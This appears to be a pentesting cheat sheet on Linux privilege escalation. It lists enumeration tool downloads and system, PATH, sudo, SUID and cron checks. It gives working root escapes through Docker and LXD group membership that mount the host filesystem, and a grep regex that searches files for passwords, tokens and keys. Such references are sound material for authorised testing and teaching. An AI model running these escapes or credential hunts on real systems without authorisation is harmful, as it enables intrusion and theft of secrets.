---
icon: linux
---

# Linux Privilege Escalation

## Tools

#### [LinPEAS](https://github.com/peass-ng/PEASS-ng)

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
```

#### [LSE](https://github.com/diego-treitos/linux-smart-enumeration)

```bash
wget https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh
```

#### [LinEnum](https://github.com/rebootuser/LinEnum)

```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

## System Info

Obtain information about the system **architecture, distribution, and kernel version**.

{% code overflow="wrap" %}
```bash
uname -a  # System information
lsb_release -a  # Distribution information
getconf LONG_BIT  # System architecture
cat /proc/version  # Kernel version
cat /etc/os-release  # OS details
```
{% endcode %}

## Path

Check if you have **write permissions** for any directory in the PATH.

{% code overflow="wrap" %}
```bash
echo $PATH | tr ':' '\n' | sort -u | xargs -I{} bash -c 'if [ -w "{}" ]; then echo "[+] {}"; fi'
```
{% endcode %}

## Environment Variables

Sometimes we can find password or sensitive information in environment variables.

```bash
env  # Environment variables
set  # Shell variables
```

## Groups

List all the groups users belongs to.

```bash
id [user]
groups [user]
```

### Docker

If you belong to the **Docker group**, you could **mount the filesystem** within a container and have full access to it, allowing you to modify it.

```bash
docker run -it --rm -v /:/mnt alpine chroot /mnt sh
```

### LXD/LXC

Similar to Docker, with **LXD/LXC**, we can also **mount the filesystem** within a container, granting full access to it.

{% code overflow="wrap" %}
```bash
# On your machine, download and build an alpine image and transfer it to the host
git clone https://github.com/saghul/lxd-alpine-builder && cd lxd-alpine-builder && sudo ./build-alpine
```
{% endcode %}

<pre class="language-bash"><code class="lang-bash"><strong># Import the image
</strong>lxc image import ./alpine.tar.gz --alias privimg
# Initialize
lxd init
# Create the containter
lxc init privimg privcont -c security.privileged=true
# Mount the filesystem
lxc config device add privcont privdev disk source=/ path=/mnt/root recursive=true
# Start the container
lxc start privcont
# Interactive shell
lxc exec privcont /bin/sh
</code></pre>

## Sudo

[https://gtfobins.github.io/](https://gtfobins.github.io/)

```bash
# List user privileges
sudo -l
# Version
sudo -V | grep "Sudo ver"
```

## Capabilities <a href="#capabilities" id="capabilities"></a>

[https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities)

```bash
getcap -r / 2>/dev/null
```

## SUID

[https://gtfobins.github.io/](https://gtfobins.github.io/)

```bash
find / -type f -perm -4000 -ls 2>/dev/null
```

## Open Ports

```bash
ss -nltp
netstat -punta
```

## Cron Jobs

[https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs)

```bash
crontab -l
find / -name "cron*" 2>/dev/null
ls -l /var/log/syslog
ls -l /var/log/cron
```

## Process Monitor

{% hint style="info" %}
You can add words to the blacklist on the `grep -Ev` section.
{% endhint %}

{% code overflow="wrap" %}
```bash
old_ps=$(ps -eo user,command); while true; do new_ps=$(ps -eo user,command); diff <(echo "$old_ps") <(echo "$new_ps") | grep "[\>\<]" | grep -Ev "kworker|user,command"; old_ps=$new_ps; done
```
{% endcode %}

## User Files

```bash
find / -user <user> -xdev 2>/dev/null
```

## Passwords

{% code overflow="wrap" %}
```bash
grep -air -oP --exclude="*."{js,css,html} '(?i)[[:space:][:punct:]]?(password|pass|passwd|pwd|credentials|creds|secret|token|key)[[:space:][:punct:]]*[:=][[:space:]]*[^[:space:]]{4,}' . | sort -u | awk -F':' '{ match_str = substr($0, index($0,$2)); gsub(/^[[:space:]]+/, "", match_str); if (length(match_str) > 50) { match_str = substr(match_str, 1, 50) "..."; } blue = "\033[34m"; red = "\033[31m"; reset = "\033[0m"; print "\nFile:  " blue $1 reset "\nMatch: " red match_str reset;}'
```
{% endcode %}

